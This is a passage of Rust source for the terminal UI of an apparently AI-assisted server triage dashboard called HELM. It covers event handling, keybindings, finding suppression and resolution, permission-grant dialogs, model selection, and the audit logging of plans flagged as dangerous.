        _ => DashboardAgeFilter::OverThirtyDays,
    }
}

fn infer_finding_kind(finding: &Finding) -> String {
    let title = finding.title.to_ascii_lowercase();
    let resource = finding.affected_resource.to_ascii_lowercase();
    let sources = finding
        .evidence
        .iter()
        .map(|e| e.source.to_ascii_lowercase())
        .collect::<Vec<_>>()
        .join(" ");
    for (needle, label) in [
        ("apache", "Apache"),
        ("nginx", "Nginx"),
        ("syslog", "Syslog"),
        ("journal", "Syslog"),
        ("auth", "Access"),
        ("ssh", "Access"),
        ("process", "Process"),
        ("docker", "Container"),
        ("podman", "Container"),
        ("backup", "Backup"),
        ("port", "Port"),
        ("timer", "Timer"),
        ("firewall", "Firewall"),
        ("memory", "Load"),
        ("cpu", "Load"),
        ("disk", "Disk"),
        ("inode", "Disk"),
    ] {
        if title.contains(needle) || resource.contains(needle) || sources.contains(needle) {
            return label.to_owned();
        }
    }
    match finding.category {
        helm_monitor::MonitorDomain::Disks => "Disk".to_owned(),
        helm_monitor::MonitorDomain::Services => "Service".to_owned(),
        helm_monitor::MonitorDomain::Containers => "Container".to_owned(),
        helm_monitor::MonitorDomain::Ports => "Port".to_owned(),
        helm_monitor::MonitorDomain::Load => "Load".to_owned(),
        helm_monitor::MonitorDomain::Logs => "Syslog".to_owned(),
        helm_monitor::MonitorDomain::Backups => "Backup".to_owned(),
        helm_monitor::MonitorDomain::Packages => "Package".to_owned(),
        helm_monitor::MonitorDomain::Network => "Network".to_owned(),
        helm_monitor::MonitorDomain::Timers => "Timer".to_owned(),
        helm_monitor::MonitorDomain::Processes => "Process".to_owned(),
        helm_monitor::MonitorDomain::Firewall => "Firewall".to_owned(),
    }
}

pub struct TuiApp {
    runtime: Arc<TuiRuntimeInner>,
    active_settings: ProviderSettings,
    session: SessionState,
    input: InputState,
    focus: PanelFocus,
    modal: Option<ModalState>,
    slash_popup: Option<usize>,
    command_palette: CommandPaletteState,
    custom_commands: Vec<custom_commands::CustomCommand>,
    keymap: KeyMap,
    running: bool,
    shutdown: bool,
    mode: AgentMode,
    show_sidebar: bool,
    spinner: usize,
    provider_name: String,
    model: String,
    active_remote: Option<String>,
    status_note: String,
    catalog_cache: HashMap<ProviderChoice, CachedModelCatalog>,
    pending_tool_summaries: HashMap<String, String>,
    active_tool_cells: HashMap<String, usize>,
    toast: Option<ToastState>,
    last_chat_height: StdCell<u16>,
    active_run_id: u64,
    agent_task: Option<JoinHandle<()>>,
    pending_auth_retry: Option<String>,
    task_started: Option<Instant>,
    session_tokens_in: u32,
    session_tokens_out: u32,
    resume_context: Option<String>,
    #[allow(dead_code)]
    theme: Theme,
    dashboard: DashboardState,
    audited_transitions: HashSet<String>,
    pending_apply_rx: Option<tokio::sync::oneshot::Receiver<Result<String, String>>>,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum ToastVariant {
    Success,
    Error,
    Info,
}

#[derive(Debug, Clone, PartialEq, Eq)]
struct ToastState {
    text: String,
    created: Instant,
    variant: ToastVariant,
}

struct TuiRuntimeInner {
    db_path: PathBuf,
    config_path: PathBuf,
    memory: Arc<MemoryStore>,
    secrets: SecretsStore,
}

impl TuiApp {
    fn new(runtime: TuiRuntime) -> Self {
        let config_path = runtime.config_path.clone();
        let mut active_settings = runtime.provider_settings.clone();

        // Allow env-only sessions without silently importing keys into the
        // persistent secrets store.
        if active_settings.api_key.is_none() {
            if let Some(env_name) = default_api_key_env(active_settings.choice) {
                let in_store = runtime.secrets.get(env_name).ok().flatten().is_some();
                if !in_store {
                    if let Ok(key) = std::env::var(env_name) {
                        active_settings.api_key = Some(key);
                    }
                }
            }
        }

        let provider_name = provider_choice_name(active_settings.choice).to_owned();
        let model = active_settings
            .model
            .clone()
            .unwrap_or_else(|| "auto".to_owned());
        let mode = AgentMode::Dashboard;

        let mut app = Self {
            runtime: Arc::new(TuiRuntimeInner {
                db_path: runtime.db_path,
                config_path,
                memory: runtime.memory,
                secrets: runtime.secrets,
            }),
            active_settings,
            session: SessionState::default(),
            input: InputState::new(),
            focus: PanelFocus::Input,
            modal: None,
            slash_popup: None,
            command_palette: CommandPaletteState::new(),
            custom_commands: custom_commands::load_all(),
            keymap: KeyMap::load(),
            running: false,
            shutdown: false,
            mode,
            show_sidebar: false,
            spinner: 0,
            provider_name,
            model,
            active_remote: runtime.remote_target,
            status_note: "ready".to_owned(),
            catalog_cache: HashMap::new(),
            pending_tool_summaries: HashMap::new(),
            active_tool_cells: HashMap::new(),
            toast: None,
            last_chat_height: StdCell::new(10),
            active_run_id: 0,
            agent_task: None,
            pending_auth_retry: None,
            task_started: None,
            session_tokens_in: 0,
            session_tokens_out: 0,
            resume_context: None,
            theme: Theme::default(),
            dashboard: DashboardState::new(),
            audited_transitions: HashSet::new(),
            pending_apply_rx: None,
        };
        if mode == AgentMode::Dashboard {
            app.refresh_dashboard();
        }
        app
    }

    async fn run(mut self, terminal: &mut Terminal<CrosstermBackend<io::Stdout>>) -> Result<()> {
        let (tx, mut rx) = mpsc::unbounded_channel::<UiEvent>();
        let overlap_guard = Arc::new(AtomicBool::new(false));
        self.dashboard.overlap_guard = Some(Arc::clone(&overlap_guard));
        spawn_input_thread(tx.clone());
        spawn_tick_task(tx.clone());
        spawn_dashboard_refresh_task(tx.clone(), overlap_guard);

        let ready = if self.mode == AgentMode::Dashboard {
            "HELM triage dashboard ready. Press F5 to refresh, Tab to move between filters, queue, and detail, or type a task."
        } else {
            "HELM ready. Type a task, or Ctrl+P for commands."
        };
        self.session.chat.push(ChatMessage {
            role: MessageRole::System,
            text: ready.to_owned(),
        });

        loop {
            terminal
                .draw(|frame| self.render(frame))
                .context("failed to draw TUI")?;
            let Some(event) = rx.recv().await else {
                return Ok(());
            };
            if self.handle_ui_event(event, tx.clone()).await? {
                return Ok(());
            }
        }
    }

    async fn handle_ui_event(
        &mut self,
        event: UiEvent,
        tx: mpsc::UnboundedSender<UiEvent>,
    ) -> Result<bool> {
        match event {
            UiEvent::Input(Event::Key(key)) if key.kind == event::KeyEventKind::Press => {
                self.handle_key(key, tx).await
            }
            UiEvent::Input(Event::Mouse(mouse)) => {
                match mouse.kind {
                    MouseEventKind::ScrollUp => {
                        let step = usize::from(self.last_chat_height.get().max(6) / 3);
                        self.session.transcript_scroll =
                            self.session.transcript_scroll.saturating_add(step.max(1));
                    }
                    MouseEventKind::ScrollDown => {
                        let step = usize::from(self.last_chat_height.get().max(6) / 3);
                        self.session.transcript_scroll =
                            self.session.transcript_scroll.saturating_sub(step.max(1));
                    }
                    _ => {}
                }
                Ok(false)
            }
            UiEvent::Input(Event::Resize(_, _)) => Ok(false),
            UiEvent::Input(_) => Ok(false),
            UiEvent::Tick => {
                self.spinner = self.spinner.wrapping_add(1);
                if self
                    .toast
                    .as_ref()
                    .is_some_and(|toast| toast.created.elapsed() > Duration::from_secs(2))
                {
                    self.toast = None;
                }
                // Poll the oneshot receiver for a completed LLM plan.
                if let Some(rx) = &mut self.dashboard.pending_plan_rx {
                    if let Ok(status) = rx.try_recv() {
                        // If the LLM produced a dangerous command, write an
                        // audit entry and tag the finding before updating the
                        // plan status.
                        if let PlanStatus::DangerousCommand {
                            pattern,
                            command_text,
                        } = &status
                        {
                            let _ = self.write_dashboard_audit(command_text, pattern);
                            if let Some(idx) = self.dashboard_selected_finding_index() {
                                self.tag_finding_rejected(idx);
                            }
                        }
                        if let Some(ref mut plan) = self.dashboard.active_plan {
                            match &status {
                                PlanStatus::RateLimited { retry_after_secs } => {
                                    let secs = *retry_after_secs;
                                    plan.status = status.clone();
                                    plan.rate_limit_retry_at =
                                        Some(Instant::now() + Duration::from_secs(secs));
                                }
                                _ => {
                                    plan.status = status.clone();
                                }
                            }
                        }
                        let active_plan_ctx = self
                            .dashboard
                            .active_plan
                            .as_ref()
                            .map(|plan| (plan.plan_id.clone(), plan.finding_id.clone()));
                        if let Some((plan_id, finding_id)) = active_plan_ctx {
                            if let Some(finding) = self
                                .dashboard
                                .data
                                .findings
                                .iter()
                                .find(|finding| finding.id == finding_id)
                                .cloned()
                            {
                                if let Ok(conn) = rusqlite::Connection::open(&self.runtime.db_path)
                                {
                                    self.persist_dashboard_plan_status(
                                        &conn, &finding, &plan_id, &status,
                                    );
                                    self.restore_active_dashboard_plan(
                                        &conn,
                                        &finding.id,
                                        Some(&plan_id),
                                    );
                                }
                            }
                        }
                        self.dashboard.pending_plan_rx = None;
                    }
                }
                // Handle rate-limited auto-retry countdown.
                if let Some(ref mut plan) = self.dashboard.active_plan {
                    if plan.rate_limit_retry_pending {
                        plan.rate_limit_retry_pending = false;
                        // We'd re-call generate but cannot borrow self here.
                        // Instead, the next Alt+G or the auto-countdown logic handles it.
                    }
                    if let Some(retry_at) = plan.rate_limit_retry_at {
                        if let PlanStatus::RateLimited { .. } = &plan.status {
                            if Instant::now() >= retry_at {
                                // Auto-retry: set a flag for the next event loop cycle.
                                plan.rate_limit_retry_pending = true;
                                plan.rate_limit_retry_at = None;
                            }
                        }
                    }
                }
                if let Some(rx) = &mut self.pending_apply_rx {
                    if let Ok(result) = rx.try_recv() {
                        if let Some(ModalState::PlanExecution {
                            ref mut phase,
                            ref mut result_summary,
                            ..
                        }) = self.modal
                        {
                            *phase = PlanExecPhase::Done;
                            *result_summary = match &result {
                                Ok(summary) => summary.clone(),
                                Err(error) => format!("Execution failed: {error}"),
                            };
                        }
                        match result {
                            Ok(summary) => self
                                .push_chat(MessageRole::System, format!("[apply-plan] {summary}")),
                            Err(error) => self.push_chat(
                                MessageRole::Error,
                                format!("[apply-plan] Execution failed: {error}"),
                            ),
                        }
                        self.pending_apply_rx = None;
                    }
                }
                Ok(false)
            }
            UiEvent::DashboardRefresh => {
                if self.mode == AgentMode::Dashboard {
                    // Save tick-related fields before refresh_dashboard() zeroes them via Default
                    let tick_instant = self.dashboard.data.last_tick_instant;
                    let tick_count = self.dashboard.data.tick_count;
                    let ticks_skipped = self.dashboard.data.ticks_skipped;
                    let consecutive_skips = self.dashboard.data.consecutive_skips;
                    self.refresh_dashboard();
                    self.dashboard.data.last_tick_instant = tick_instant;
                    self.dashboard.data.tick_count = tick_count;
                    self.dashboard.data.ticks_skipped = ticks_skipped;
                    self.dashboard.data.consecutive_skips = consecutive_skips;
                }
                Ok(false)
            }
            UiEvent::DashboardLiveRefresh => {
                if self.mode == AgentMode::Dashboard {
                    let _ = self.refresh_dashboard_live().await;
                }
                Ok(false)
            }
            UiEvent::TickSkipped => {
                if self.mode == AgentMode::Dashboard {
                    self.dashboard.data.ticks_skipped += 1;
                    self.dashboard.data.consecutive_skips += 1;
                }
                Ok(false)
            }
        }
    }

    async fn handle_key(
        &mut self,
        key: KeyEvent,
        tx: mpsc::UnboundedSender<UiEvent>,
    ) -> Result<bool> {
        if self.modal.is_some() {
            return self.handle_modal_key(key, tx).await;
        }

        // Slash popup navigation (intercept before normal input handling)
        if self.slash_popup.is_some() && !key.modifiers.contains(KeyModifiers::CONTROL) {
            match key.code {
                KeyCode::Esc => {
                    self.slash_popup = None;
                    return Ok(false);
                }
                KeyCode::Up => {
                    if let Some(sel) = &mut self.slash_popup {
                        *sel = sel.saturating_sub(1);
                    }
                    return Ok(false);
                }
                KeyCode::Down => {
                    let max = self.slash_filtered().len().saturating_sub(1);
                    if let Some(sel) = &mut self.slash_popup {
                        *sel = (*sel + 1).min(max);
                    }
                    return Ok(false);
                }
                KeyCode::Enter if !key.modifiers.contains(KeyModifiers::ALT) => {
                    self.execute_slash_from_popup(tx).await?;
                    return Ok(self.shutdown);
                }
                KeyCode::Tab => {
                    let filtered = self.slash_filtered();
                    if let Some(sel) = self.slash_popup {
                        if let Some(cmd) = filtered.get(sel) {
                            self.input.text = format!("/{}", cmd.slug());
                            self.input.cursor = self.input.text.chars().count();
                            self.update_slash_popup();
                        }
                    }
                    return Ok(false);
                }
                _ => {}
            }
        }

        if key.modifiers.contains(KeyModifiers::CONTROL) {
            if self.key_matches(&key, "cancel", KeyCode::Char('c'), KeyModifiers::CONTROL) {
                if self.running {
                    self.cancel_running_task();
                    return Ok(false);
                }
                return Ok(true);
            }
            if self.key_matches(&key, "quit", KeyCode::Char('d'), KeyModifiers::CONTROL)
                && self.input.text.is_empty()
            {
                return Ok(true);
            }
            if self.key_matches(&key, "newline", KeyCode::Char('j'), KeyModifiers::CONTROL) {
                self.input.insert_newline();
                return Ok(false);
            }
            if self.key_matches(&key, "palette", KeyCode::Char('p'), KeyModifiers::CONTROL) {
                self.open_palette();
                return Ok(false);
            }
            if self.key_matches(
                &key,
                "tool_sidebar",
                KeyCode::Char('t'),
                KeyModifiers::CONTROL,
            ) {
                self.show_sidebar = !self.show_sidebar;
                self.toast(if self.show_sidebar {
                    "Sidebar visible"
                } else {
                    "Sidebar hidden"
                });
                return Ok(false);
            }
            if self.key_matches(&key, "history", KeyCode::Char('h'), KeyModifiers::CONTROL) {
                self.modal = Some(ModalState::Help);
                return Ok(false);
            }
            if self.key_matches(&key, "clear", KeyCode::Char('l'), KeyModifiers::CONTROL) {
                self.clear_transcript();
                return Ok(false);
            }

            match key.code {
                KeyCode::Char('n') => self.new_session(),
                KeyCode::Char('r') => self.push_chat(MessageRole::System, self.replay_hint()),
                KeyCode::Char('a') => {
                    self.modal = Some(ModalState::Permission {
                        capability: Capability::ShellShell,
                        tool_name: "pending".to_owned(),
                        taint: "user".to_owned(),
                        detail: "No pending permission request.".to_owned(),
                    });
                }
                KeyCode::Home => self.session.transcript_scroll = usize::MAX / 2,
                KeyCode::End => self.session.transcript_scroll = 0,
                KeyCode::Char('u') => self.input.clear(),
                _ => {}
            }
            return Ok(false);
        }

        if self.mode == AgentMode::Dashboard
            && self.input.text.trim().is_empty()
            && !key.modifiers.contains(KeyModifiers::CONTROL)
        {
            match key.code {
                KeyCode::Enter
                    if !key.modifiers.contains(KeyModifiers::ALT)
                        && !key.modifiers.contains(KeyModifiers::SHIFT) =>
                {
                    self.handle_dashboard_enter(tx.clone()).await?;
                    return Ok(false);
                }
                KeyCode::F(5) => {
                    self.refresh_dashboard_live().await?;
                    return Ok(false);
                }
                KeyCode::Char('r') if key.modifiers.contains(KeyModifiers::ALT) => {
                    self.refresh_dashboard_live().await?;
                    return Ok(false);
                }
                KeyCode::Char('f') if key.modifiers.contains(KeyModifiers::ALT) => {
                    self.run_dashboard_follow_up(tx.clone()).await?;
                    return Ok(false);
                }
                KeyCode::Char('e') if key.modifiers.contains(KeyModifiers::ALT) => {
                    if let Some(idx) = self.dashboard_selected_finding_index() {
                        self.dashboard.view = DashboardView::EvidenceView(idx);
                        self.dashboard.detail_scroll = 0;
                    }
                    return Ok(false);
                }
                KeyCode::Char('g') if key.modifiers.contains(KeyModifiers::ALT) => {
                    self.generate_dashboard_plan().await?;
                    return Ok(false);
                }
                KeyCode::Char('a') if key.modifiers.contains(KeyModifiers::ALT) => {
                    self.apply_dashboard_plan().await?;
                    return Ok(false);
                }
                KeyCode::Char('s')
                    if key.modifiers.is_empty() || key.modifiers.contains(KeyModifiers::ALT) =>
                {
                    if let Some(finding) = self.current_dashboard_finding().cloned() {
                        let db_path = self.runtime.db_path.clone();
                        let conn = rusqlite::Connection::open(&db_path)?;
                        FindingStateStore::set_status(
                            &conn,
                            &finding.fingerprint,
                            FindingStateStatus::Suppressed,
                            "suppressed from dashboard",
                            "reviewed and muted",
                            &finding.snapshot_id,
                            &finding.id,
                        )
                        .map_err(|e| anyhow!("{e}"))?;
                        self.write_dashboard_event(
                            "finding-state",
                            Capability::FsRead.as_str(),
                            "suppressed",
                            &helm_memory::stable_hash_hex(&finding.fingerprint),
                            &helm_memory::stable_hash_hex(&format!(
                                "{}:{}",
                                finding.snapshot_id, finding.id
                            )),
                        )?;
                        self.refresh_dashboard();
                        self.toast(format!("Suppressed {}", finding.id));
                    }
                    return Ok(false);
                }
                KeyCode::Char('r')
                    if key.modifiers.is_empty() || key.modifiers.contains(KeyModifiers::ALT) =>
                {
                    if let Some(finding) = self.current_dashboard_finding().cloned() {
                        let db_path = self.runtime.db_path.clone();
                        let conn = rusqlite::Connection::open(&db_path)?;
                        FindingStateStore::set_status(
                            &conn,
                            &finding.fingerprint,
                            FindingStateStatus::Resolved,
                            "",
                            "resolved from dashboard",
                            &finding.snapshot_id,
                            &finding.id,
                        )
                        .map_err(|e| anyhow!("{e}"))?;
                        self.write_dashboard_event(
                            "finding-state",
                            Capability::FsRead.as_str(),
                            "resolved",
                            &helm_memory::stable_hash_hex(&finding.fingerprint),
                            &helm_memory::stable_hash_hex(&format!(
                                "{}:{}",
                                finding.snapshot_id, finding.id
                            )),
                        )?;
                        self.refresh_dashboard();
                        self.toast(format!("Resolved {}", finding.id));
                    }
                    return Ok(false);
                }
                KeyCode::Char('u')
                    if key.modifiers.is_empty() || key.modifiers.contains(KeyModifiers::ALT) =>
                {
                    if let Some(finding) = self.current_dashboard_finding().cloned() {
                        let db_path = self.runtime.db_path.clone();
                        let conn = rusqlite::Connection::open(&db_path)?;
                        FindingStateStore::clear(&conn, &finding.fingerprint)
                            .map_err(|e| anyhow!("{e}"))?;
                        self.write_dashboard_event(
                            "finding-state",
                            Capability::FsRead.as_str(),
                            "reopened",
                            &helm_memory::stable_hash_hex(&finding.fingerprint),
                            &helm_memory::stable_hash_hex(&format!(
                                "{}:{}",
                                finding.snapshot_id, finding.id
                            )),
                        )?;
                        self.refresh_dashboard();
                        self.toast(format!("Reopened {}", finding.id));
                    }
                    return Ok(false);
                }
                KeyCode::Char('1') => {
                    self.dashboard.active_tab = OpsTab::Alerts;
                    return Ok(false);
                }
                KeyCode::Char('2') => {
                    self.dashboard.active_tab = OpsTab::Services;
                    return Ok(false);
                }
                KeyCode::Char('3') => {
                    self.dashboard.active_tab = OpsTab::Processes;
                    return Ok(false);
                }
                KeyCode::Char('4') => {
                    self.dashboard.active_tab = OpsTab::Logs;
                    return Ok(false);
                }
                KeyCode::Char('5') => {
                    self.dashboard.active_tab = OpsTab::Network;
                    return Ok(false);
                }
                KeyCode::Char('6') => {
                    self.dashboard.active_tab = OpsTab::Disk;
                    return Ok(false);
                }
                KeyCode::Char('7') => {
                    self.dashboard.active_tab = OpsTab::Changes;
                    return Ok(false);
                }
                _ => {}
            }
        }
        if !key.modifiers.contains(KeyModifiers::ALT)
            && !key.modifiers.contains(KeyModifiers::SHIFT)
            && self.key_matches(&key, "send", KeyCode::Enter, KeyModifiers::NONE)
        {
            self.submit(tx).await?;
            if self.shutdown {
                return Ok(true);
            }
            return Ok(false);
        }
        if self.input.text.is_empty()
            && self.key_matches(&key, "help", KeyCode::Char('?'), KeyModifiers::NONE)
        {
            self.modal = Some(ModalState::Help);
            return Ok(false);
        }

        match key.code {
            KeyCode::Enter
                if key.modifiers.contains(KeyModifiers::ALT)
                    || key.modifiers.contains(KeyModifiers::SHIFT) =>
            {
                self.input.insert_newline()
            }
            KeyCode::Char('?') if self.input.text.is_empty() => {
                self.modal = Some(ModalState::Help);
            }
            KeyCode::Char(ch) => {
                self.input.insert(ch);
                self.update_slash_popup();
            }
            KeyCode::Backspace => {
                self.input.backspace();
                self.update_slash_popup();
            }
            KeyCode::Delete => {
                self.input.delete();
                self.update_slash_popup();
            }
            KeyCode::Left
                if !(self.mode == AgentMode::Dashboard
                    && self.dashboard.view == DashboardView::Overview
                    && self.input.text.is_empty()) =>
            {
                self.input.cursor = self.input.cursor.saturating_sub(1)
            }
            KeyCode::Right
                if !(self.mode == AgentMode::Dashboard
                    && self.dashboard.view == DashboardView::Overview
                    && self.input.text.is_empty()) =>
            {
                self.input.cursor = (self.input.cursor + 1).min(self.input.text.chars().count());
            }
            KeyCode::Home => self.input.cursor = 0,
            KeyCode::End => self.input.cursor = self.input.text.chars().count(),
            KeyCode::Up if self.mode == AgentMode::Dashboard => match self.dashboard.view {
                DashboardView::Overview => match self.dashboard.pane {
                    DashboardFocus::Tabbar | DashboardFocus::Table => {
                        // Fleet tab has special navigation for row selection
                        if self.dashboard.active_tab == OpsTab::Fleet {
                            if let Some(row) = self.dashboard.fleet_selected_row {
                                self.dashboard.fleet_selected_row = Some(row.saturating_sub(1));
                            } else {
                                self.dashboard.fleet_selected_row = Some(0);
                            }
                        } else {
                            self.move_dashboard_selection(-1)
                        }
                    }
                    DashboardFocus::Detail => {
                        self.dashboard.detail_scroll =
                            self.dashboard.detail_scroll.saturating_sub(1);
                    }
                },
                _ => {
                    self.dashboard.detail_scroll = self.dashboard.detail_scroll.saturating_sub(1);
                }
            },
            KeyCode::Down if self.mode == AgentMode::Dashboard => match self.dashboard.view {
                DashboardView::Overview => match self.dashboard.pane {
                    DashboardFocus::Tabbar | DashboardFocus::Table => {
                        // Fleet tab has special navigation for row selection
                        if self.dashboard.active_tab == OpsTab::Fleet {
                            let row = self.dashboard.fleet_selected_row.unwrap_or(0);
                            let max = self.dashboard.data.fleet_hosts.len().saturating_sub(1);
                            self.dashboard.fleet_selected_row = Some((row + 1).min(max));
                        } else {
                            self.move_dashboard_selection(1)
                        }
                    }
                    DashboardFocus::Detail => {
                        self.dashboard.detail_scroll =
                            self.dashboard.detail_scroll.saturating_add(1);
                    }
                },
                _ => {
                    self.dashboard.detail_scroll = self.dashboard.detail_scroll.saturating_add(1);
                }
            },
            KeyCode::Left
                if self.mode == AgentMode::Dashboard
                    && self.dashboard.view == DashboardView::Overview
                    && self.input.text.is_empty()
                    && self.dashboard.pane == DashboardFocus::Tabbar =>
            {
                let tabs = OpsTab::all();
                let current = tabs
                    .iter()
                    .position(|t| *t == self.dashboard.active_tab)
                    .unwrap_or(0);
                let prev = current.saturating_sub(1);
                self.dashboard.active_tab = tabs[prev];
            }
            KeyCode::Right
                if self.mode == AgentMode::Dashboard
                    && self.dashboard.view == DashboardView::Overview
                    && self.input.text.is_empty()
                    && self.dashboard.pane == DashboardFocus::Tabbar =>
            {
                let tabs = OpsTab::all();
                let current = tabs
                    .iter()
                    .position(|t| *t == self.dashboard.active_tab)
                    .unwrap_or(0);
                let next = (current + 1).min(tabs.len().saturating_sub(1));
                self.dashboard.active_tab = tabs[next];
            }
            // ── Dashboard filter cycling (Table or Detail focus) ──
            KeyCode::Left
                if self.mode == AgentMode::Dashboard
                    && self.dashboard.view == DashboardView::Overview
                    && self.input.text.is_empty()
                    && (self.dashboard.pane == DashboardFocus::Table
                        || self.dashboard.pane == DashboardFocus::Detail) =>
            {
                self.cycle_dashboard_filter(-1);
            }
            KeyCode::Right
                if self.mode == AgentMode::Dashboard
                    && self.dashboard.view == DashboardView::Overview
                    && self.input.text.is_empty()
                    && (self.dashboard.pane == DashboardFocus::Table
                        || self.dashboard.pane == DashboardFocus::Detail) =>
            {
                self.cycle_dashboard_filter(1);
            }
            KeyCode::Up => self.input.previous_history(),
            KeyCode::Down => self.input.next_history(),
            KeyCode::PageUp => {
                let step = usize::from(self.last_chat_height.get().max(6) / 2).max(1);
                if self.mode == AgentMode::Dashboard {
                    match self.dashboard.view {
                        DashboardView::Overview if self.dashboard.pane == DashboardFocus::Table => {
                            self.move_dashboard_selection(-(step as isize));
                        }
                        DashboardView::Overview => {
                            self.dashboard.detail_scroll =
                                self.dashboard.detail_scroll.saturating_sub(step);
                        }
                        _ => {
                            self.dashboard.detail_scroll =
                                self.dashboard.detail_scroll.saturating_sub(step);
                        }
                    }
                } else {
                    self.session.transcript_scroll =
                        self.session.transcript_scroll.saturating_add(step);
                }
            }
            KeyCode::PageDown => {
                let step = usize::from(self.last_chat_height.get().max(6) / 2).max(1);
                if self.mode == AgentMode::Dashboard {
                    match self.dashboard.view {
                        DashboardView::Overview if self.dashboard.pane == DashboardFocus::Table => {
                            self.move_dashboard_selection(step as isize);
                        }
                        DashboardView::Overview => {
                            self.dashboard.detail_scroll =
                                self.dashboard.detail_scroll.saturating_add(step);
                        }
                        _ => {
                            self.dashboard.detail_scroll =
                                self.dashboard.detail_scroll.saturating_add(step);
                        }
                    }
                } else {
                    self.session.transcript_scroll =
                        self.session.transcript_scroll.saturating_sub(step);
                }
            }
            KeyCode::Tab => {
                if self.mode == AgentMode::Dashboard
                    && self.dashboard.view == DashboardView::Overview
                {
                    self.dashboard.pane = match self.dashboard.pane {
                        DashboardFocus::Tabbar => DashboardFocus::Table,
                        DashboardFocus::Table => DashboardFocus::Detail,
                        DashboardFocus::Detail => self.dashboard.pane,
                    };
                } else {
                    self.focus = PanelFocus::Input
                }
            }
            KeyCode::BackTab => {
                if self.mode == AgentMode::Dashboard
                    && self.dashboard.view == DashboardView::Overview
                {
                    self.dashboard.pane = match self.dashboard.pane {
                        DashboardFocus::Tabbar => DashboardFocus::Detail,
                        DashboardFocus::Table => DashboardFocus::Tabbar,
                        DashboardFocus::Detail => DashboardFocus::Table,
                    };
                } else {
                    self.toast(format!("Mode changed to {}", self.mode.as_str()));
                }
            }
            KeyCode::Esc => {
                if self.mode == AgentMode::Dashboard {
                    match self.dashboard.view {
                        DashboardView::Overview | DashboardView::FindingDetail(_) => {
                            self.dashboard.view = DashboardView::Overview;
                            self.dashboard.pane = DashboardFocus::Table;
                            self.dashboard.detail_scroll = 0;
                        }
                        DashboardView::EvidenceView(idx) => {
                            self.dashboard.view = DashboardView::FindingDetail(idx);
                            self.dashboard.detail_scroll = 0;
                        }
                        DashboardView::TroubleshootPlan(idx) => {
                            self.dashboard.view = DashboardView::EvidenceView(idx);
                            self.dashboard.detail_scroll = 0;
                        }
                    }
                } else {
                    self.focus = PanelFocus::Input;
                }
            }
            _ => {}
        }
        Ok(false)
    }

    async fn handle_modal_key(
        &mut self,
        key: KeyEvent,
        tx: mpsc::UnboundedSender<UiEvent>,
    ) -> Result<bool> {
        match self.modal.clone() {
            Some(ModalState::CommandPalette) => match key.code {
                KeyCode::Esc => self.modal = None,
                KeyCode::Enter => {
                    let commands = self.filtered_palette_items();
                    if let Some(command) = commands.get(self.command_palette.selected).cloned() {
                        self.execute_palette_item(command, tx).await?;
                        return Ok(self.shutdown);
                    }
                }
                KeyCode::Char(ch) => {
                    self.command_palette.query.push(ch);
                    self.command_palette.selected = 0;
                }
                KeyCode::Backspace => {
                    self.command_palette.query.pop();
                    self.command_palette.selected = 0;
                }
                KeyCode::Up => {
                    self.command_palette.selected = self.command_palette.selected.saturating_sub(1)
                }
                KeyCode::Down => {
                    let max = self.filtered_palette_items().len().saturating_sub(1);
                    self.command_palette.selected = (self.command_palette.selected + 1).min(max);
                }
                _ => {}
            },
            Some(ModalState::Permission { capability, .. }) => match key.code {
                KeyCode::Esc | KeyCode::Char('n') | KeyCode::Char('N') => {
                    self.push_chat(MessageRole::System, "Permission denied.");
                    self.toast_variant("Permission denied", ToastVariant::Error);
                    self.modal = None;
                }
                KeyCode::Char('y') | KeyCode::Char('Y') => {
                    let memory = Arc::clone(&self.runtime.memory);
                    tokio::spawn(async move {
                        memory
                            .grant_capability(capability, helm_core::GrantScope::Once)
                            .await
                            .ok();
                    });
                    self.push_chat(MessageRole::System, format!("Granted {capability} once."));
                    self.toast_variant("Permission granted once", ToastVariant::Success);
                    self.modal = None;
                }
                KeyCode::Char('s') | KeyCode::Char('S') => {
                    let memory = Arc::clone(&self.runtime.memory);
                    tokio::spawn(async move {
                        memory
                            .grant_capability(capability, helm_core::GrantScope::Session)
                            .await
                            .ok();
                    });
                    self.push_chat(
                        MessageRole::System,
                        format!("Granted {capability} for session."),
                    );
                    self.toast_variant("Permission granted for session", ToastVariant::Success);
                    self.modal = None;
                }
                KeyCode::Char('a') | KeyCode::Char('A') => {
                    let memory = Arc::clone(&self.runtime.memory);
                    tokio::spawn(async move {
                        memory
                            .grant_capability(capability, helm_core::GrantScope::Always)
                            .await
                            .ok();
                    });
                    self.push_chat(MessageRole::System, format!("Granted {capability} always."));
                    self.toast_variant("Permission granted always", ToastVariant::Success);
                    self.modal = None;
                }
                _ => {}
            },
            Some(ModalState::ProviderSelector { .. }) => match key.code {
                KeyCode::Esc => self.modal = None,
                KeyCode::Char(d @ '1'..='7') => {
                    let choices = provider_selector_list();
                    let idx = (d as usize) - ('1' as usize);
                    if let Some((choice, _)) = choices.get(idx) {
                        self.apply_provider_choice(*choice);
                    }
                }
                KeyCode::Up => {
                    if let Some(ModalState::ProviderSelector { selected }) = &mut self.modal {
                        *selected = selected.saturating_sub(1);
                    }
                }
                KeyCode::Down => {
                    if let Some(ModalState::ProviderSelector { selected }) = &mut self.modal {
                        let max = provider_selector_list().len().saturating_sub(1);
                        *selected = (*selected + 1).min(max);
                    }
                }
                KeyCode::Enter => {
                    if let Some(ModalState::ProviderSelector { selected }) = self.modal.clone() {
                        let choices = provider_selector_list();
                        if let Some((choice, _)) = choices.get(selected) {
                            self.apply_provider_choice(*choice);
                        } else {
                            self.modal = None;
                        }
                    }
                }
                _ => {}
            },
            Some(ModalState::ModelSelector { .. }) => match key.code {
                KeyCode::Esc => self.modal = None,
                KeyCode::Enter => {
                    if let Some(ModalState::ModelSelector {
                        query,
                        selected,
                        entries,
                    }) = self.modal.clone()
                    {
                        let filtered = filtered_model_catalog(&entries, &query);
                        if let Some(entry) = filtered.get(selected).cloned() {
                            self.apply_model_entry(entry);
                        } else if !query.trim().is_empty() {
                            self.apply_manual_model(query.trim().to_owned());
                        }
                    }
                }
                KeyCode::Up => {
                    if let Some(ModalState::ModelSelector { selected, .. }) = &mut self.modal {
                        *selected = selected.saturating_sub(1);
                    }
                }
                KeyCode::Down => {
                    if let Some(ModalState::ModelSelector {
                        query,
                        selected,
                        entries,
                    }) = &mut self.modal
                    {
                        let max = filtered_model_catalog(entries, query)
                            .len()
                            .saturating_sub(1);
                        *selected = (*selected + 1).min(max);
                    }
                }
                KeyCode::Backspace => {
                    if let Some(ModalState::ModelSelector {
                        query, selected, ..
                    }) = &mut self.modal
                    {
                        query.pop();
                        *selected = 0;
                    }
                }
